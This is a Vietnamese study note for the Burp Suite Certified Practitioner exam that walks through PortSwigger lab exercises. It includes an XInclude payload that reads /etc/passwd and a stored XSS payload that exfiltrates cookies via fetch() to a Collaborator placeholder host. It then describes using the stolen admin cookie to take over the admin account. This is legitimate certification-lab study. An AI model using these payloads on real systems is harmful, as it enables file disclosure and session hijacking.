---
title: "BSCP"
description: "hành trình đến với chiếc cert thứ 2"
slug: "about"
menu:
    main:
        weight: 2
        params: 
            icon: user
---


![image](https://hackmd.io/_uploads/S1coHjNhZg.png)


[Làm theo form này](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)

# Enumeration 

--- 

## Focus Scanning

--- 

![image](https://hackmd.io/_uploads/ByFA4jNn-x.png)
click như trên để scan 
![image](https://hackmd.io/_uploads/ByjSro43Wg.png)
click vào dashboard để thấy được thông tin ; sau đó test bằng payload ở dưới để đọc passwd

![image](https://hackmd.io/_uploads/Bk85NoE2Wg.png)
Payload : 
```code!
%3cfoo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"%3e%3cxi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/%3e%3c/foo
```

## Scanning non-standard data structures 

### Bước 1 — Đăng nhập và quan sát session cookie
Đăng nhập với `wiener:peter`. Vào `Proxy` → `HTTP History`, tìm `request GET /my-account?id=wiener`.

Quan sát `cookie session`: Cookie chứa username ở dạng `cleartext`, theo sau là một `token`, phân tách bởi dấu hai chấm (`:`). Điều này gợi ý rằng ứng dụng xử lý giá trị `cookie` như hai input riêng biệt. PortSwigger
Ví dụ cookie trông như:`wiener:abc123tokenxyz`
Mục đích: Nhận ra rằng Burp Scanner mặc định sẽ coi toàn bộ cookie là một giá trị duy nhất, nên không thể phát hiện lỗ hổng nằm ở phần username. **Ta cần chỉ định insertion point thủ công**.

Bước 2 — Scan selected insertion point
Chọn (highlight) phần đầu tiên của session cookie — phần cleartext wiener. Click chuột phải chọn "Scan selected insertion point", rồi nhấn OK. PortSwigger
Mục đích: Thay vì scan toàn bộ cookie, ta chỉ đánh dấu phần username làm điểm chèn payload. Đây chính là kỹ thuật cốt lõi của bài lab — khi gặp cấu trúc dữ liệu không chuẩn, Burp Scanner sẽ coi toàn bộ chuỗi như một giá trị duy nhất và chèn payload sai vị trí. Bằng cách tự định nghĩa insertion point, ta có thể scan chính xác từng phần riêng biệt. PortSwigger

Bước 3 — Xem kết quả scan
Vào Dashboard, đợi khoảng 1 phút. Burp Scanner sẽ báo cáo một issue Cross-site scripting (stored). PortSwigger
Mở tab Request ở panel phía dưới để xem request mà Burp Scanner đã dùng để phát hiện lỗ hổng. Gửi request này sang Repeater.

Bước 4 — Craft payload XSS để lấy cookie admin
Vào tab Collaborator → Copy to clipboard để lấy Burp Collaborator domain.
Trong Repeater, dùng Inspector để xem cookie ở dạng decoded. Thay thế PoC của Burp bằng payload exfiltrate cookie:
```code!
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-TOKEN-PART
```
Lưu ý quan trọng:

Phần trước dấu : → payload XSS (thay thế cho username)
Phần sau dấu : → giữ nguyên session token hiện tại của bạn (không được xóa)
URL encode các ký tự đặc biệt nếu cần (dấu ', ", <, >, backtick)

Mục đích: Khi admin truy cập trang, payload XSS stored sẽ thực thi trong browser của admin, gửi cookie của admin đến Collaborator server của bạn.
![image](https://hackmd.io/_uploads/HJmaNVJp-x.png)

Bước 5 — Thu thập cookie admin
Nhấn Apply changes → Send trong Repeater.
Quay lại tab Collaborator, đợi khoảng 1 phút, nhấn `Poll now`. Collaborator server sẽ nhận được các tương tác DNS và HTTP mới PortSwigger — trong đó chứa cookie của admin được encode trong URL path.
Decode URL để lấy giá trị cookie admin.
![image](https://hackmd.io/_uploads/B1DMV4Ja-g.png)

Bước 6 — Truy cập admin panel và xóa carlos
Trong browser, mở DevTools (F12) → Application/Storage → Cookies. Thay thế session cookie hiện tại bằng cookie admin vừa lấy được.
Truy cập /admin panel → tìm và xóa user carlos → lab solved.
![image](https://hackmd.io/_uploads/rk0sXEJ6-l.png)

